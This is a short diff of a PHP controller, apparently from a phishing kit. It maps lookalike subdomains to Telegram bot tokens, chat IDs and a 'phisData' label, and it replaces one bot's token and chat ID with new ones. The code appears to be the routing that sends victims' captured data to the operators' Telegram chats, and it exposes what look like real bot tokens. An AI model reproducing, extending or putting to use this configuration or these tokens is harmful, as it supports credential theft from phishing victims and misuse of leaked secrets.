@@ -180,9 +180,9 @@ class HomeController extends Controller
             $phisData = "MY16";
         } else if ($subdomain == "livegroup-vcx17") {
             // BOT 17
-            $bot_token = "7270446058:AAHLzCew-iWBEs9rShYxm-WZR_wxELhrq2Y";
+            $bot_token = "7564573541:AAFIAFk_fk4EAHI0FJeq-k4Q6s-ez0dm3aM";
 
-            $chat_id = "5865500600";
+            $chat_id = "7661101050";
             $phisData = "MY17";
         } else if ($subdomain == "livegroup-vcx18") {
             // BOT 18
